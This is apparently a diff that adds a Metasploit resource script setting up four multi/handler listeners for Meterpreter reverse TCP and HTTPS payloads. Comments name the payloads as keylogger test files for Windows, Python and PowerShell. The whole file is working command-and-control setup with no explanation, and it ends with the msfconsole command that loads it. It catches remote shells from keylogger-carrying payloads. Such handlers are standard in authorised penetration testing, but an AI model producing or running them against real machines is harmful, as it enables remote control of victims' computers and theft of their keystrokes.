@@ -1,0 +1,36 @@
+# Metasploit Resource Script for Keylogger Testing
+# This script sets up handlers for the generated test payloads
+
+# Handler for windows_keylogger_test.exe
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+# Handler for python_keylogger_test.py
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4445
+set ExitOnSession false
+exploit -j
+
+# Handler for windows_https_keylogger.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.1.100
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+# Handler for powershell_keylogger.ps1
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 8080
+set ExitOnSession false
+exploit -j
+
+# To use this script, run: msfconsole -r handler_setup.rc
